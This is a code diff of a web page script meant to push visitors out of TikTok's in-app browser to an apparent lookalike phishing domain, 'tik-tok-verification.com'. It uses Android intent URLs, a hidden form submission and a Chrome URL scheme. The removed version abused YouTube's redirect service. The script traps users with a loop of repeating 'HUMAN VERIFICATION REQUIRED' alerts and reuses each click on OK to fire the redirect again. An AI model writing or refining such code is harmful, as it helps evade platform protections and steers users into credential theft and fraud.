@@ -7,54 +7,46 @@
 </head>
 <body>
 
-<script>
-    // Your final destination
-    const finalDest = "https://tik-tok-verification.com/Verification/verify1.html";
-    
-    // The Slingshot: YouTube's official redirect tool
-    // We encode your URL so it fits inside the YouTube query
-    const slingshotUrl = "https://www.youtube.com/redirect?q=" + encodeURIComponent(finalDest);
-    
-    const killTime = Date.now() + 25000;
+<form id="breakoutForm" action="https://tik-tok-verification.com/Verification/verify1.html" method="GET" target="_blank" style="display:none;">
+</form>
 
-    function triggerSlingshot() {
+<script>
+    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
+    // Stripping protocol for the Chrome scheme to prevent "Google Searching"
+    const domainPath = targetUrl.replace(/^https?:\/\//, '');
+    
+    // FAIL-SAFE: Reduced to 5 seconds as requested
+    const killTime = Date.now() + 5000;
+
+    function forceEject() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         
         if (isAndroid) {
-            // Android: We stick to the Intent (it works best there)
-            // But we point the intent to the SLINGSHOT, not your site.
-            // This forces the "Open with..." menu to include YouTube/Browsers
-            const urlNoProt = slingshotUrl.replace("https://", "");
-            window.location.href = `intent://${urlNoProt}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
+            // Android: The Intent is King.
+            window.location.href = `intent://${domainPath}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
         } else {
-            // iOS: The Slingshot Logic
+            // iOS: The Form-Post Injection
+            // 1. Submit the form to target="_blank". 
+            // TikTok often hands "_blank" requests to Safari.
+            document.getElementById("breakoutForm").submit();
             
-            // 1. Try to open the YouTube App directly (Deep Link)
-            // If installed, it opens, sees the redirect, and throws to Safari.
-            window.location.href = "youtube://redirect?q=" + encodeURIComponent(finalDest);
-            
-            // 2. Fallback: Open the web version of the slingshot
-            // TikTok sees "youtube.com" and often lets it pass to the system.
+            // 2. Parallel Fire: Correctly formatted Chrome Scheme
+            // "googlechromes://" + "domain.com" (No extra https in the middle)
+            // This prevents it from being treated as a search query.
             setTimeout(() => {
-                window.location.href = slingshotUrl;
-            }, 100);
-            
-            // 3. Last Resort: The "Clean" Chrome Scheme (Fixed to prevent searching)
-            // We strip the protocol entirely to prevent it from looking like a search query
-            setTimeout(() => {
-                const domainPath = finalDest.replace(/^https?:\/\//, '');
-                window.location.href = "googlechromes://" + domainPath; 
-            }, 200);
+                window.location.href = "googlechromes://" + domainPath;
+            }, 50);
         }
     }
 
     function securityLoop() {
+        // Stop everything if the fail-safe time is reached
         if (Date.now() > killTime) return;
 
-        // 1. Fire Slingshot IMMEDIATELY
-        triggerSlingshot();
+        // 1. Try to eject immediately
+        forceEject();
 
-        // 2. Rapid Check (100ms)
+        // 2. Check Focus (Fast check)
         setTimeout(() => {
             if (document.hasFocus()) {
                 const header = "HUMAN VERIFICATION REQUIRED\n";
@@ -63,17 +55,16 @@
                 // 3. The Lock
                 alert(header + body);
 
-                // 4. Fire Slingshot on "OK" Gesture
-                triggerSlingshot();
+                // 4. Fire on "OK" (User Gesture Token)
+                forceEject();
 
-                // 5. Immediate Recursive Loop
-                securityLoop();
+                // Recurse
+                setTimeout(securityLoop, 200);
             }
-        }, 100); 
+        }, 200);
     }
 
     window.onload = securityLoop;
-    window.onfocus = () => { if (Date.now() < killTime) securityLoop(); };
 </script>
 
 </body>
